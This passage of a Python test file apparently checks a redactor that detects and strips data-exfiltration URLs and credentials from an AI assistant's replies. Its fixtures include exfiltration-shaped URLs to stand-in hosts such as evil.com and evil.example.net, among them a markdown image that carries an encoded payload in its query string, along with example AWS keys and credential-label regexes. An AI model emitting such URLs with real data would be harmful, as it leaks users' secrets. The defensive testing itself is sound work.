        assert "adopt_variant_text(target_dict, chosen)" in src
        assert 'target_dict["content"] =' not in src


class TestMetaCarveOut:
    @staticmethod
    def _good_record() -> dict:
        return {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": "/reports/summary",
            "query_chars": 42,
            "url": None,
            "url_withheld": "length",
        }

    def test_valid_record_survives_meta_redaction(self) -> None:
        meta = {"blocked_links": [self._good_record()], "other": "value"}

        out = _redact_meta_for_role("assistant", meta)

        assert out["blocked_links"] == [self._good_record()]

    def test_tampered_records_are_dropped_individually(self) -> None:
        good = self._good_record()
        meta = {
            "blocked_links": [
                good,
                {
                    "domain": "not a host!!",
                    "rule": "exfil_query_length",
                    "path": None,
                    "query_chars": 1,
                    "url": None,
                    "url_withheld": "length",
                },
                {
                    "domain": _DOMAIN,
                    "rule": "Bad Rule",
                    "path": None,
                    "query_chars": 1,
                    "url": None,
                    "url_withheld": "length",
                },
                {
                    "domain": _DOMAIN,
                    "rule": "exfil_query_length",
                    "path": "/dump/AKIAIOSFODNN7EXAMPLE",
                    "query_chars": 0,
                    "url": None,
                    "url_withheld": "length",
                },
                {"domain": _DOMAIN, "unexpected": "key", "rule": "x", "path": None},
                {
                    "domain": _DOMAIN,
                    "rule": "exfil_query_length",
                    "path": None,
                    "query_chars": -1,
                    "url": None,
                    "url_withheld": "length",
                },
            ]
        }

        out = _redact_meta_for_role("assistant", meta)

        # Exactly the well-formed record survives; every tampered sibling is
        # dropped on its own, and the message is not discarded.
        assert out["blocked_links"] == [good]

    def test_all_bad_records_drop_the_key(self) -> None:
        meta = {"blocked_links": [{"wrong": "shape"}], "keep": "me"}

        out = _redact_meta_for_role("assistant", meta)

        assert "blocked_links" not in out
        assert out["keep"] == "me"

    def test_revalidate_rejects_payload_bearing_path(self) -> None:
        record = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": "/dump/AKIAIOSFODNN7EXAMPLE",
            "query_chars": 0,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) is None

    def test_revalidate_rejects_boolean_query_chars(self) -> None:
        record = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": True,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) is None


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-n0"]))


class TestEveryRetentionPointIsBounded:
    """Records read off a transcript line are bounded where the slot KEEPS them.

    A bound applied only where the value is displayed leaves the store holding
    whatever the line carried, so each place that retains a row's meta or a
    variant list goes through ``with_bounded_redaction_records``.
    """

    @staticmethod
    def _many() -> list[dict]:
        return [
            {
                "domain": f"h{i}.example.com",
                "rule": "exfil_query_length",
                "path": None,
                "query_chars": 256,
                "url": None,
                "url_withheld": "length",
            }
            for i in range(exfil.MAX_BLOCKED_LINKS_PER_MESSAGE + 8)
        ]

    def test_the_helper_bounds_and_drops_and_leaves_other_keys(self) -> None:
        from kiro_crew.dashboard.chat_utils import with_bounded_redaction_records

        bounded = with_bounded_redaction_records({"mid": "m1", "blocked_links": self._many()})
        assert bounded["mid"] == "m1"
        assert len(bounded["blocked_links"]) == exfil.MAX_BLOCKED_LINKS_PER_MESSAGE

        assert with_bounded_redaction_records({"blocked_links": [{"domain": "x"}]}) == {}
        plain = {"mid": "m1"}
        assert with_bounded_redaction_records(plain) is plain

    def test_attached_variants_are_bounded_on_load(self) -> None:
        class _Slot:
            messages: list[dict] = [{"role": "assistant", "content": "c"}]

        slot = _Slot()
        chat_persistence._attach_variants(
            slot,  # type: ignore[arg-type]
            {"variants": [{"content": "v", "ts": "t", "blocked_links": self._many()}]},
        )

        assert len(slot.messages[-1]["variants"][0]["blocked_links"]) == (
            exfil.MAX_BLOCKED_LINKS_PER_MESSAGE
        )

    def test_each_retention_site_uses_the_bounded_helper(self) -> None:
        # Source guard over the sites that retain transcript data in the slot:
        # the two rehydrate appends, the variant attach, and the regenerate stash.
        import inspect

        from kiro_crew.dashboard import chat_runner

        persistence = inspect.getsource(chat_persistence)
        assert 'meta=(m["meta"] if' not in persistence
        assert persistence.count('with_bounded_redaction_records(m["meta"])') == 2
        assert "with_bounded_redaction_records(" in inspect.getsource(
            chat_persistence._attach_variants
        )
        stash = inspect.getsource(chat_runner._flush_segment)
        assert "with_bounded_redaction_records({**v" in stash


class TestAVariantsRecordsAreCheckedOnServe:
    """A variant's records can hold a full address a reader may open, so they
    pass the same serve-time check as a row's before reaching a client."""

    def test_a_forged_variant_record_is_dropped_on_emit(self) -> None:
        forged = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 0,
            "url": f"https://{_DOMAIN}/dump/AKIAIOSFODNN7EXAMPLE",
            "url_withheld": None,
        }
        msgs = [
            {
                "role": "assistant",
                "content": "x",
                "ts": "t0",
                "variants": [{"content": "v", "ts": "t1", "blocked_links": [forged]}],
            }
        ]

        out = _prepare_messages(msgs, False, live_child="")

        assert "blocked_links" not in out[0]["variants"][0]
        assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(out)

    def test_a_valid_variant_record_survives_emit(self) -> None:
        url = f"https://{_DOMAIN}/p?q={_LONG_QUERY_TAIL}"
        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")
        msgs = [
            {
                "role": "assistant",
                "content": "x",
                "ts": "t0",
                "variants": [{"content": "v", "ts": "t1", "blocked_links": records}],
            }
        ]

        out = _prepare_messages(msgs, False, live_child="")

        assert out[0]["variants"][0]["blocked_links"] == records


class TestARawCopyNeverOutlivesTheTextItMirrors:
    """Through the real ``_run_chat``: a site that clears the visible text mid-turn
    clears its raw copy too, so an address streamed before the boundary is never
    listed against the reply the reader sees after it.

    The reply after the boundary opens on a link redacted inside its own delta,
    so the flush takes that address's record from the raw copy: the reset
    beside each clear is the only thing keeping the earlier address out, which
    is what these pin.
    """

    _HOST = "h.example-sink.net"

    def _events(self, boundary: object) -> list[object]:
        from kiro_crew.acp.types import (
            EVENT_COMPLETE,
            EVENT_TEXT_CHUNK,
            STOP_REASON_END_TURN,
            AcpEvent,
        )

        unseen = f"https://{self._HOST}/before?q=" + "x" * 250
        after = f"https://{self._HOST}/after?q=" + "y" * 250
        return [
            AcpEvent(kind=EVENT_TEXT_CHUNK, text="draft "),
            AcpEvent(kind=EVENT_TEXT_CHUNK, text=unseen),
            AcpEvent(kind=EVENT_TEXT_CHUNK, text=" . "),
            boundary,
            AcpEvent(kind=EVENT_TEXT_CHUNK, text=after),
            AcpEvent(kind=EVENT_TEXT_CHUNK, text=" is the one."),
            AcpEvent(kind=EVENT_COMPLETE, stop_reason=STOP_REASON_END_TURN),
        ]

    def _paths(self, record: object) -> list[object]:
        rows = [r for r in record.rows("assistant") if "is the one" in str(r.get("content"))]
        assert len(rows) == 1
        return [link.get("path") for link in (rows[0].get("meta") or {}).get("blocked_links", [])]

    @pytest.mark.asyncio
    async def test_a_compaction_boundary_clears_the_raw_copy(self) -> None:
        from turn_harness import TurnScript, run_turn

        from kiro_crew.acp.types import EVENT_COMPACTION_STATUS, AcpEvent

        boundary = AcpEvent(kind=EVENT_COMPACTION_STATUS, text="completed", context_usage_pct=40.0)
        record = await run_turn(TurnScript(events=self._events(boundary)))

        assert self._paths(record) == ["/after"]

    @pytest.mark.asyncio
    async def test_a_mid_turn_clear_clears_the_raw_copy(self) -> None:
        from turn_harness import SlotSpec, TurnScript, run_turn

        from kiro_crew.acp.types import EVENT_CLEAR_STATUS, AcpEvent

        record = await run_turn(
            TurnScript(events=self._events(AcpEvent(kind=EVENT_CLEAR_STATUS))),
            slot=SlotSpec(rows=[("user", "earlier"), ("assistant", "earlier answer")]),
        )

        assert self._paths(record) == ["/after"]


class TestEnclosingQuoteSurvivesRedaction:
    """The URL path class admits ``'`` so a URL-internal apostrophe is read (the
    round-37 ``]'<token>`` shape stays one scanned URL), but a ``'`` before a
    delimiter or the text's end is the closing quote of a single-quoted scalar,
    string or attribute and ends the match. Admitting it unconditionally made a
    redaction eat the closing quote (invalid YAML/JS), merged a two-URL list into
    one URL judged under the first (exempt) host so the second URL's payload
    shipped, and glued the quote onto a presigned signature so a valid URL was
    wrongly redacted. The class now ends at the closing quote, matching the base,
    while the bracket-token URL is still blocked."""

    def test_a_single_quoted_yaml_scalar_keeps_its_closing_quote(self) -> None:
        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"url: '{url}'")

        assert warnings
        assert cleaned == f"url: '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'"
        assert cleaned.count("'") % 2 == 0

    def test_a_single_quoted_js_string_keeps_its_closing_quote(self) -> None:
        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"const u = '{url}';")

        assert warnings
        assert cleaned == f"const u = '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]';"

    def test_a_single_quoted_scalar_keeps_the_sibling_after_it(self) -> None:
        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"- '{url}'\n- next: 1")

        assert warnings
        assert cleaned == f"- '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'\n- next: 1"

    def test_a_quoted_list_does_not_merge_the_second_url_under_the_first_host(self) -> None:
        # The closing quote of the first list item ends its URL, so the second,
        # evil URL is judged on its OWN host instead of being swallowed into the
        # first (exempt) one and skipping the heuristics -- a security regression.
        # Asserted on the records' domain field with ==, not a substring test on
        # the warning text (which CodeQL reads as a URL sanitizer).
        evil = f"https://evil.example.net/?d={_LONG_QUERY_TAIL}"
        text = f"['https://{_DOMAIN}/a','{evil}']"
        cleaned, warnings, records = redact_exfiltration_urls_with_records(
            text, extra_exempt_hosts=frozenset({_DOMAIN})
        )

        assert [r["domain"] for r in records] == ["evil.example.net"]
        assert _LONG_QUERY_TAIL not in cleaned

    def test_a_compact_quoted_list_redacts_both_suspicious_urls(self) -> None:
        # Both items are suspicious. The match ends at the first closing quote,
        # so each URL is its own match, judged and replaced; a span that spanned
        # both replaced only the first and left the second (token included)
        # readable, which the per-URL loop never rescanned.
        a = f"https://a.example/?d={_LONG_QUERY_TAIL}"
        b = f"https://b.example/?e={_LONG_QUERY_TAIL}X"
        cleaned, warnings = redact_exfiltration_urls(f"['{a}','{b}']")

        assert len(warnings) >= 2, warnings
        assert cleaned == (
            f"['{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}a.example]'"
            f",'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}b.example]']"
        )

    def test_a_single_quoted_presigned_shaped_url_excludes_the_enclosing_quote(self) -> None:
        # The presigned false positive was the enclosing ' glued onto the last
        # param (X-Amz-Signature), which failed the presigned fast-path and
        # redacted a valid URL. The match now ends at the closing quote, so the
        # last param value is intact. Asserted at the _URL_RE boundary with a
        # non-credential signature so no AWS key id is committed (the end-to-end
        # _is_safe_presigned path is exercised by the probe, which cannot be
        # pinned here without a real AKIA/ASIA id the content and secret scanners
        # flag).
        sig = "a" * 64
        url = f"https://b.s3.amazonaws.com/f.csv?X-Amz-Signature={sig}"
        match = exfil._URL_RE.search(f"requests.get('{url}')")

        assert match is not None
        assert match.group(0) == url

    def test_a_single_quoted_presigned_s3_url_is_left_intact(self) -> None:
        # End-to-end: a valid single-quoted presigned URL validates and is NOT
        # redacted, because the match ends at the closing quote, so
        # X-Amz-Signature validates and the URL stays intact. Uses the AWS
        # documentation example key id, which the content scan and Semgrep
        # allowlist and which the presigned fast-path accepts (AKIA prefix).
        url = (
            "https://my-bucket.s3.us-east-1.amazonaws.com/results/abc.csv"
            "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
            "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
            "&X-Amz-Date=20260430T150000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host"
            "&X-Amz-Signature="
            "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
        )
        cleaned, warnings = redact_exfiltration_urls(f"requests.get('{url}')")

        assert not warnings
        assert "[REDACTED" not in cleaned
        assert cleaned == f"requests.get('{url}')"

    def test_a_quoted_concatenation_of_two_urls_is_two_matches(self) -> None:
        # `'<url-a>'+'<url-b>'` is a string concatenation of two URLs, not one.
        # `+` is not a value byte, but the ' before it was admitted because `+`
        # is not a delimiter, so the match ran through `'+'` into url-b and
        # judged it under url-a's host. The :// guard ends url-a's match at its
        # closing quote, so each URL is its own match and judged on its own host.
        a = f"https://a.example/x?d={_LONG_QUERY_TAIL}"
        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
        cleaned, warnings, records = redact_exfiltration_urls_with_records(
            f"x = '{a}'+'{b}';", extra_exempt_hosts=frozenset({"a.example"})
        )

        # a.example is exempt and keeps its query; the fix is that b.example is
        # judged on its OWN host (one record) instead of merged under a's.
        assert [r["domain"] for r in records] == ["b.example"]

    def test_a_quoted_url_ending_in_a_separator_keeps_the_next_url_separate(self) -> None:
        # `'<url-a>?q='+'<url-b>'` and the `,` form: url-a's closing quote sits
        # right after `=`, a value opener, but a `+` then a quote (or a `,`)
        # follows, which is a concatenation, not a value byte, so the quote ends
        # url-a's match and url-b is judged on its own host even when url-a's is
        # exempt. A credential value byte after the quote (or after a `+`) still
        # reads as the same URL, which the slash/plus pin covers.
        a = "https://a.example/search?q="
        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
        for joiner in ("+", ","):
            _cleaned, _warnings, records = redact_exfiltration_urls_with_records(
                f"x = '{a}'{joiner}'{b}';", extra_exempt_hosts=frozenset({"a.example"})
            )
            assert [r["domain"] for r in records] == ["b.example"], joiner

    def test_two_quoted_urls_joined_by_a_word_are_judged_on_their_own_hosts(self) -> None:
        # `'<url-a>?q='and'<url-b>'`: url-a's closing quote sits right after `=`
        # and a letter follows it, which reads as a value byte, but the quote
        # before url-b is followed by a URL SCHEME, which no URL value carries
        # unquoted, so that quote ends the match. url-b is then a match of its
        # own, judged on its own host even when url-a's is exempt, in a bare
        # line and inside a double-quoted string alike; the scan warns on it.
        a = "https://a.example/search?q="
        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
        for text in (f"'{a}'and'{b}'", f"x = \"'{a}'or'{b}'\"", f"'{a}'{b}'"):
            _cleaned, _warnings, records = redact_exfiltration_urls_with_records(
                text, extra_exempt_hosts=frozenset({"a.example"})
            )
            assert [r["domain"] for r in records] == ["b.example"], text
            assert _LONG_QUERY_TAIL not in _cleaned, text
            assert scan_exfiltration_urls(text), text

    def test_a_non_http_scheme_separator_inside_a_query_stays_in_that_query(self) -> None:
        # `?d=://<payload>`, `?d=ftp://<payload>`, `?x=a://AKIA...`: a `://` that no
        # `http`/`https` word precedes is a byte of the URL's own query, not the
        # start of a second URL the class could match, so the bytes after it are
        # scanned with the URL and the payload is flagged and redacted, as on the
        # base. Only a second `http(s)://` bounds a match.
        for tail in (
            f"://{_LONG_QUERY_TAIL}",
            f"ftp://{_LONG_QUERY_TAIL}",
            "a://AKIAIOSFODNN7EXAMPLE",
            "ftp://ghp%5F" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
        ):
            url = f"https://{_DOMAIN}/c?d={tail}"
            assert scan_exfiltration_urls(url), url
            cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
            assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
            assert _LONG_QUERY_TAIL not in cleaned and "AKIAIOSFODNN7EXAMPLE" not in cleaned, url
            assert "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8" not in cleaned, url

    def test_semicolon_separated_quoted_urls_are_separate_matches(self) -> None:
        a = f"https://a.example/x?d={_LONG_QUERY_TAIL}"
        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"'{a}';'{b}'")

        assert len(warnings) >= 2, warnings
        assert cleaned == (
            f"'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}a.example]'"
            f";'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}b.example]'"
        )

    def test_an_html_attribute_url_keeps_its_closing_quote_and_markup(self) -> None:
        # A `'` before `>` is a URL byte to neither class, so the match ends at
        # the attribute's closing quote and the markup after it stays.
        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"<a href='{url}'>x</a>")

        assert warnings
        assert cleaned == (f"<a href='{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'>x</a>")

    def test_a_js_string_url_keeps_its_closing_quote_and_trailing_call(self) -> None:
        # A `'` before `.` ends the match, so the string's closing quote and the
        # `.trim()` call after it stay.
        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
        cleaned, warnings = redact_exfiltration_urls(f"u='{url}'.trim()")

        assert warnings
        assert cleaned == (f"u='{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'.trim()")

    def test_a_slash_or_plus_opened_value_after_a_bare_close_is_scanned(self) -> None:
        # The URL match ends at the quote, as the base's does, and the hard floor
        # reads `aws_secret_access_key=]` as a labelled value, as the base does:
        # the scan warns and the vetting path blocks, whatever byte follows the
        # quote (`/` and `+` included). The bytes after the quote are the
        # credential pass's to mask (`redact_credentials` reads `]'<secret>` as
        # the value), not this pass's.
        secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        for head in ("/", "+"):
            url = f"https://{_DOMAIN}/x?aws_secret_access_key=]'{head}{secret}"
            cleaned, warnings = redact_exfiltration_urls(url)

            assert scan_exfiltration_urls(url), head
            assert warnings, head
            assert cleaned.startswith(exfil.EXFILTRATION_REDACTION_TAG_PREFIX), head


class TestTheUrlFloorReadsAsTheBaseDoes:
    """The exfil URL floor uses the base's URL grammar and its coarse labelled
    branches, plus ONE exemption for a value that is a run of the redactor's own
    tags. Everything else the URL floor says, the base says."""

    # The base's URL class and labelled branches, as literal copies: the oracle
    # these tests hold the floor to. They are not imported from the product so
    # a product change cannot move the oracle with it.
    _BASE_URL_RE = re.compile(
        r"https?://("
        r"[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}"
        r"|\d{1,3}(?:\.\d{1,3}){3}"
        r"|\[[0-9A-Fa-f:.]+\]"
        r")(:\d+)?([/?][^\s)\"'>]*)?"
    )
    _BASE_LABELLED_RE = re.compile(
        r'(?:SecretAccessKey|aws_secret_access_key)["\']?\s*[:=]\s*["\']?[^\s"\',}]+'
        r'|(?:SessionToken|aws_session_token)["\']?\s*[:=]\s*["\']?[^\s"\',}]+'
        r'|(?:AccessKeyId|aws_access_key_id)["\']?\s*[:=]\s*["\']?[^\s"\',}]+',
        re.IGNORECASE,
    )
    _SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    _ROUND_INPUTS = (
        # a quoted value opening with a path or base64 byte
        f"https://{_DOMAIN}/x?aws_secret_access_key=]'/{_SECRET}",
        f"https://{_DOMAIN}/x?aws_secret_access_key=]'+{_SECRET}",
        # two quoted URLs joined by a separator
        f"x = 'https://a.example/search?q=','https://b.example/c?d={_LONG_QUERY_TAIL}';",
        f"x = 'https://a.example/search?q='+'https://b.example/c?d={_LONG_QUERY_TAIL}';",
        # two quoted URLs joined by a word, bare and inside a string
        f"'https://a.example/x?q='and'https://b.example/?data={_LONG_QUERY_TAIL}'",
        f"x = \"'https://a.example/x?q='or'https://b.example/?data={_LONG_QUERY_TAIL}'\"",
        # a separator no http word precedes, inside a query
        f"https://{_DOMAIN}/c?d=://{_LONG_QUERY_TAIL}",
        f"https://{_DOMAIN}/c?d=ftp://{_LONG_QUERY_TAIL}",
        f"https://{_DOMAIN}/c?x=a://AKIAIOSFODNN7EXAMPLE",
        # a nested URL as a labelled value, a nested http query value
        f"https://a.example/x?Session%54oken=https://b.example/?d={_LONG_QUERY_TAIL}",
        f"![a](https://evil.com/i.png?q=http://{_LONG_QUERY_TAIL})",
        # a URL ending inside a quoted scalar, attribute or call
        f"url: 'https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'",
        f"<a href='https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'>x</a>",
        f"u='https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'.trim()",
    )

    def test_a_nested_url_as_a_labelled_value_is_flagged_and_redacted(self) -> None:
        # The labelled key is percent-encoded and its value is a second URL. The outer URL is ONE match to the host's end of the line, as
        # on the base, so the decoded query carries `SessionToken=https://...`
        # and the hard floor flags it; the whole outer URL is redacted.
        url = f"https://a.example/x?Session%54oken=https://b.example/?d={_LONG_QUERY_TAIL}"
        assert scan_exfiltration_urls(url), url
        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
        assert warnings and [r["domain"] for r in records] == ["a.example"], url
        assert _LONG_QUERY_TAIL not in cleaned and "b.example" not in cleaned, cleaned

    def test_a_markdown_image_with_a_nested_http_query_value_is_flagged(self) -> None:
        # The image URL's query value begins with `http://`. The match runs to
        # the `)` as on the base, the long base64 query is read
        # whole and flagged, and the URL is redacted inside the markdown.
        text = f"![a](https://evil.com/i.png?q=http://{_LONG_QUERY_TAIL})"
        assert scan_exfiltration_urls(text), text
        cleaned, warnings, records = redact_exfiltration_urls_with_records(text)
        assert warnings and [r["domain"] for r in records] == ["evil.com"], text
        assert _LONG_QUERY_TAIL not in cleaned, cleaned
        assert cleaned.startswith("![a](") and cleaned.endswith(")"), cleaned

    def test_the_url_class_reads_the_round_inputs_as_the_base_does(self) -> None:
        # Every URL span the product's class finds in the round inputs is the
        # span the base's class finds: no quote branch, no iterator, no split.
        for text in self._ROUND_INPUTS:
            ours = [(m.span(), m.group(1), m.group(3) or "") for m in exfil._URL_RE.finditer(text)]
            base = [
                (m.span(), m.group(1), m.group(3) or "") for m in self._BASE_URL_RE.finditer(text)
            ]
            assert ours == base, text

    def test_the_hard_floor_reads_the_round_inputs_as_the_base_does(self) -> None:
        # On every path and query of the round inputs, raw and percent-decoded,
        # the product's floor answers exactly as the base does: its labelled
        # branches plus the AWS key-id marker (the shared spelling), which one
        # input carries; the SSH, PEM and Slack markers are the base's own and
        # the inputs carry none.
        from urllib.parse import unquote

        from kiro_crew.credential_patterns import AWS_KEY_ID

        base_floor = re.compile(f"{AWS_KEY_ID}|{self._BASE_LABELLED_RE.pattern}", re.IGNORECASE)
        for text in self._ROUND_INPUTS:
            for match in self._BASE_URL_RE.finditer(text):
                for payload in (match.group(3) or "", unquote(match.group(3) or "")):
                    assert hard_credential_hit(payload) is (
                        base_floor.search(payload) is not None
                    ), (text, payload)

    def test_the_one_divergence_from_the_base_is_a_tag_filled_value(self) -> None:
        # The redactor keeps the key and replaces the value, so its own output
        # `aws_secret_access_key=[REDACTED: credential]` is cleaned text. The base
        # reads it as a live labelled value; this floor does not, and ONLY when
        # the value is a run of registered tags followed by a boundary: another
        # case, glued bytes or a value byte after the tag are live to both.
        tag = "[REDACTED: credential]"
        for clean in (
            f"aws_secret_access_key={tag}",
            f"aws_secret_access_key={tag}&next=1",
            f'"aws_secret_access_key": "{tag}"',
            f"SessionToken={tag}{tag}",
            f"aws_session_token={tag} and more",
        ):
            assert self._BASE_LABELLED_RE.search(clean) is not None, clean
            assert hard_credential_hit(clean) is False, clean
        for live in (
            f"aws_secret_access_key={tag}{self._SECRET}",
            "aws_secret_access_key=[redacted: credential]",
            f"aws_secret_access_key={tag[:-1]}",
            f"aws_session_token={tag}\\n{self._SECRET}",
            f"SessionToken={tag},{self._SECRET[:24]}",
            f"aws_secret_access_key={tag}}}x",
        ):
            assert self._BASE_LABELLED_RE.search(live) is not None, live
            assert hard_credential_hit(live) is True, live

    def test_a_tag_with_a_comma_glued_token_in_a_query_is_flagged_as_on_the_base(self) -> None:
        # In a URL query a bare value runs to `&`, so a `,` after a tag run is not
        # where a value ends: `SessionToken=[REDACTED: credential],<token>` is a
        # labelled value to this floor as the base's floor reads it (the tag as the
        # value), and the URL is flagged and redacted; with the label's `T`
        # percent-encoded the raw query names no label and the decoded one must.
        token = "AbCdEfGhIjKlMnOpQrStUvWx"
        url = f"https://{_DOMAIN}/x?Session%54oken=[REDACTED:%20credential],{token}"
        decoded = f"SessionToken=[REDACTED: credential],{token}"
        assert self._BASE_LABELLED_RE.search(decoded) is not None, decoded
        assert hard_credential_hit(decoded) is True, decoded
        assert scan_exfiltration_urls(url), url
        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
        assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
        assert token not in cleaned, cleaned

    def test_a_quoted_tag_with_bytes_glued_after_its_close_is_a_value_as_on_the_base(self) -> None:
        # The exemption is for a tag that IS the whole value, in every form. A
        # quoted tag whose closing quote has bytes glued to it
        # (`SecretAccessKey="[REDACTED: credential]"<secret>`, which a
        # percent-decoded URL path carries as `%22...%22<secret>`) read as exempt
        # on the quoted branch while the bare branch already required a boundary:
        # the glued secret rode through the URL gate. The quoted and escaped-quote
        # forms now require the same boundary after the close as the bare form
        # after its run, so every glued form is a value, as the base reads it.
        from urllib.parse import quote

        tag = "[REDACTED: credential]"
        secret = self._SECRET
        fragmented = quote(secret[:8]) + f"%{ord(secret[8]):02X}" + quote(secret[9:])
        url = f"https://{_DOMAIN}/p/%53ecretAccessKey=%22%5BREDACTED%3A%20credential%5D%22{fragmented}"
        assert scan_exfiltration_urls(url), url
        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
        assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
        assert fragmented not in cleaned, cleaned
        for live in (
            f'SecretAccessKey="{tag}"{secret}',
            f'SecretAccessKey=\\"{tag}\\"{secret}',
            f"SecretAccessKey='{tag}'{secret}",
            f"SecretAccessKey={tag}{secret}",
            f'SecretAccessKey="{tag}"%22{secret}',
        ):
            assert self._BASE_LABELLED_RE.search(live) is not None, live
            assert hard_credential_hit(live) is True, live

    def test_a_tag_that_is_the_whole_value_stays_exempt_in_every_form(self) -> None:
        # The controls: the tag alone, quoted, escaped-quoted or bare, followed by
        # a boundary (whitespace, a quote, `&`, an escaped quote or the end; after
        # a quoted close also the `,` or `}` a JSON document continues with), is
        # the redactor's own output and stays cleaned text to this floor.
        tag = "[REDACTED: credential]"
        for clean in (
            f'SecretAccessKey="{tag}"',
            f'SecretAccessKey="{tag}" tail',
            f'SecretAccessKey="{tag}"&next=1',
            f'{{"SessionToken": "{tag}", "Expiration": "2030-01-01T00:00:00Z"}}',
            f'{{"SessionToken": "{tag}"}}',
            f'SecretAccessKey="{tag}",{self._SECRET}',
            f'SecretAccessKey=\\"{tag}\\"',
            f'SecretAccessKey=\\"{tag}\\" tail',
            f"SecretAccessKey='{tag}'",
            f"SecretAccessKey={tag}",
            f"SecretAccessKey={tag}&next=1",
            f"SecretAccessKey={tag} tail",
        ):
            assert self._BASE_LABELLED_RE.search(clean) is not None, clean
            assert hard_credential_hit(clean) is False, clean

    def test_the_glued_shapes_read_as_the_base_does_raw_and_decoded(self) -> None:
        # Parity oracle over the glued family: on every path and query of these
        # URLs, raw and percent-decoded, the floor answers exactly as the base's
        # labelled branches do (the base has no exemption, so every one is live).
        from urllib.parse import quote, unquote

        tag_enc = "%5BREDACTED%3A%20credential%5D"
        secret = quote(self._SECRET)
        urls = (
            f"https://{_DOMAIN}/p/%53ecretAccessKey=%22{tag_enc}%22{secret}",
            f"https://{_DOMAIN}/p/SecretAccessKey=%27{tag_enc}%27{secret}",
            f"https://{_DOMAIN}/x?Session%54oken=%5C%22{tag_enc}%5C%22{secret}",
            f"https://{_DOMAIN}/x?Session%54oken={tag_enc}{secret}",
        )
        for url in urls:
            assert scan_exfiltration_urls(url), url
            for match in self._BASE_URL_RE.finditer(url):
                for payload in (match.group(3) or "", unquote(match.group(3) or "")):
                    assert hard_credential_hit(payload) is (
                        self._BASE_LABELLED_RE.search(payload) is not None
                    ), (url, payload)

    def test_an_escaped_empty_quote_pair_ahead_of_a_value_is_live_as_on_the_base(self) -> None:
        # `SecretAccessKey=\\""<secret>`: the base's value class takes the backslash
        # as a one-byte value and flags the pair; a regex that read `\\"` as an
        # escaped opener then needed a value byte, found the second quote, and
        # matched nothing, so a percent-encoded URL path carrying the shape
        # (`SecretAccessKey%3D%5C%22%22<fragmented secret>`) passed the gate. The
        # floor's candidate set is the base's regex by construction now; the
        # exemption is a check applied after the match, so no quote shape can
        # remove a match the base makes.
        from urllib.parse import quote

        secret = self._SECRET
        fragmented = quote(secret[:8]) + f"%{ord(secret[8]):02X}" + quote(secret[9:])
        decoded = f'SecretAccessKey=\\""{secret}'
        assert self._BASE_LABELLED_RE.search(decoded) is not None, decoded
        assert hard_credential_hit(decoded) is True, decoded
        url = f"https://{_DOMAIN}/p/SecretAccessKey%3D%5C%22%22{fragmented}"
        assert scan_exfiltration_urls(url), url
        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
        assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
        assert fragmented not in cleaned, cleaned
        inside_json = '{"text": "SecretAccessKey=\\\\\\"\\\\\\"' + secret + '"}'
        assert self._BASE_LABELLED_RE.search(inside_json) is not None, inside_json
        assert hard_credential_hit(inside_json) is True, inside_json

    def test_the_floor_equals_the_bases_regex_on_every_non_tag_labelled_value(self) -> None:
        # The parity oracle over NON-tag labelled values: on every fixture row and
        # every round shape whose value is not the redactor's own tag, the floor's
        # answer equals the base's regex applied verbatim (the literal copy above):
        # the exemption subtracts only tag-filled values from the base's match set.
        import json
        import sys
        from pathlib import Path as _Path

        sys.path.insert(0, str(_Path(__file__).resolve().parent))
        from redaction_keyed_value_fixture import decode_rows

